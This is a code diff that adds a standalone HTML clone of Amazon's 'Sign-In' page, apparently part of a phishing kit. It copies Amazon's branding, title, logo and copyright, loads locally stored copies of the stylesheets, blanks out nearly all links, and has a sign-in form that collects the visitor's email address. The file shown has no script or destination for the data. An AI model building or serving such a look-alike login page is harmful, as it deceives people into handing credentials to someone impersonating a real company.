@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember a-ws" data-19ax5a9jf="dingo" data-aui-build-date="3.23.1-2023-11-28">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title dir="ltr">Amazon Sign-In</title>
+  <link rel="icon" type="image/png" href="../assets/images/Amazonicon.png"/>
+
+  <link rel="stylesheet" href="../assets/css/61A6IErPNXL.css">
+  <link rel="stylesheet" href="../assets/css/01SdjaY0ZsL.css">
+  <link rel="stylesheet" href="../assets/css/21PFuszay6L.css">
+</head>
+
+<body class="auth-no-skin ap-locale-en_US a-m-us a-aui_72554-c a-aui_accordion_a11y_role_354025-t1 a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate">
+  <div class="a-section a-padding-medium auth-workflow">
+    <div class="a-section a-spacing-none auth-navbar">
+      <div class="a-section a-spacing-medium a-text-center">
+
+
+        <a class="a-link-nav-icon" tabindex="-1" href="">
+
+          <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
+
+        </a>
+
+      </div>
+    </div>
+    <div id="authportal-center-section" class="a-section">
+
+
+
+      <div id="authportal-main-section" class="a-section">
+        <div class="a-section a-spacing-base auth-pagelet-container">
+
+
+
+          <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning" aria-live="polite" aria-atomic="true">
+            <div class="a-box-inner a-alert-container">
+              <h4 class="a-alert-heading">Please Enable Cookies to Continue</h4><i class="a-icon a-icon-alert"></i>
+              <div class="a-alert-content">
+                <p>
+                  <a class="a-link-normal" href="#">
+
+                  </a>
+                </p>
+              </div>
+            </div>
+          </div>
+
+
+        </div>
+        <div class="a-section auth-pagelet-container">
+          <!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain --><!-- Set cross domain sso variables to be used for making Ajax calls to central Identity domain --><!-- show a warning modal dialog when the third party account is connected with Amazon -->
+          <div id="passkey-error-alert" class="a-box a-alert a-alert-error aok-hidden" role="alert">
+            <div class="a-box-inner a-alert-container">
+              <h4 class="a-alert-heading">Passkey error</h4><i class="a-icon a-icon-alert"></i>
+              <div class="a-alert-content">
+                <p id="passkey-client-error-message">
+                  Something went wrong, please sign-in another way or follow any instructions provided by your device.
+                </p>
+                <p id="passkey-generic-server-error-message" class="aok-hidden">
+                  Sorry, your passkey isn't working. There might be a problem with the server. Sign in with your password or try your passkey again later.
+                </p>
+                <p id="passkey-server-error-message" class="aok-hidden"></p>
+              </div>
+            </div>
+          </div>
+          <div class="a-section a-spacing-base">
+            <div class="a-section">
+
+              <form name="signIn" method="post" novalidate="" class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="IEEEncMN">
+                <div class="a-section">
+                  <div class="a-box">
+                    <div class="a-box-inner a-padding-extra-large">
+                      <h1 class="a-spacing-small">
+                        Sign in
+                      </h1>
+                      <!-- optional subheading element -->
+
+                      <div class="a-row a-spacing-base">
+                        <label for="ap_email" class="a-form-label">
+                          Enter your email address
+                        </label>
+                        <input type="email" maxlength="128" id="ap_email" name="Email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field" require>
+
+                        <div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert">
+                          <div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i>
+                            <div class="a-alert-content">
+                              Enter your email or mobile phone number
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                      <div class="a-section">
+
+                        <span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" tabindex="5" class="a-button-input" type="submit" name="continue" aria-labelledby="continue-announce"><span id="continue-announce" class="a-button-text" aria-hidden="true">
+                              Continue
+                            </span></span></span>
+
+
+                        <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
+                          By continuing, you agree to Amazon's <a href="">Conditions of Use</a> and <a href="">Privacy Notice</a>.
+                        </div>
+                      </div>
+                      <div class="a-section">
+                        <div class="a-row a-expander-container a-expander-inline-container">
+                          <a data-csa-c-func-deps="aui-da-a-expander-toggle" data-csa-c-type="widget" data-csa-interaction-events="click" aria-expanded="false" role="button" href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}" data-csa-c-id="fkqvms-qtitwb-76i8aq-sspo9"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">
+                              Need help?
+                            </span></a>
+
+                          <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
+
+
+
+
+                            <a id="auth-fpp-link-bottom" class="a-link-normal" href="0">
+                              Forgot your password?
+                            </a>
+                          </div>
+
+                          <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
+                            <a id="ap-other-signin-issues-link" class="a-link-normal" href="">
+                              Other issues with Sign-In
+                            </a>
+                          </div>
+                        </div>
+                      </div>
+                      <div id="ab-signin-link-section" class="a-section">
+                        <hr aria-hidden="true" class="a-divider-normal">
+                        <div class="a-section a-spacing-micro">
+                          <span class="a-text-bold">
+                            Buying for work?
+                          </span>
+                        </div> <a id="ab-sign-in-ingress-link" class="a-link-normal" href="">
+                          <span>
+                            Shop on Amazon Business
+                          </span>
+                        </a>
+                      </div>
+
+                    </div>
+                  </div>
+                </div>
+                <input name="metadata1" type="hidden" value=""><input type="hidden" name="aaToken" value="{&quot;uniqueValidationId&quot;:&quot;391769ee-f98a-421a-974e-3d2e37c70e25&quot;}">
+              </form>
+            </div>
+
+
+
+
+
+            <div class="a-divider a-divider-break">
+              <h5 aria-level="5">New to Amazon?</h5>
+            </div>
+            <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" href="" class="a-button-text">
+                  Create your Amazon account
+                </a></span></span>
+
+
+          </div>
+        </div>
+      </div>
+
+
+    </div>
+    <div id="right-2">
+    </div>
+    <div class="a-section a-spacing-top-extra-large auth-footer">
+
+      <div class="a-divider a-divider-section">
+        <div class="a-divider-inner"></div>
+      </div>
+      <div class="a-section a-spacing-small a-text-center a-size-mini">
+        <span class="auth-footer-seperator"></span>
+
+
+
+
+        <a class="a-link-normal" target="_blank" rel="noopener" href="">
+          Conditions of Use
+        </a>
+        <span class="auth-footer-seperator"></span>
+
+
+
+
+
+        <a class="a-link-normal" target="_blank" rel="noopener" href="">
+          Privacy Notice
+        </a>
+        <span class="auth-footer-seperator"></span>
+
+
+
+
+
+        <a class="a-link-normal" target="_blank" rel="noopener" href="">
+          Help
+        </a>
+        <span class="auth-footer-seperator"></span>
+
+      </div>
+      <div class="a-section a-spacing-none a-text-center">
+        <span class="a-size-mini a-color-secondary">
+          © 1996-2024, Amazon.com, Inc. or its affiliates
+        </span>
+      </div>
+    </div>
+  </div>
+  <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
+  </div>
+  </div>
+  <div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
+</body>
+
+</html>
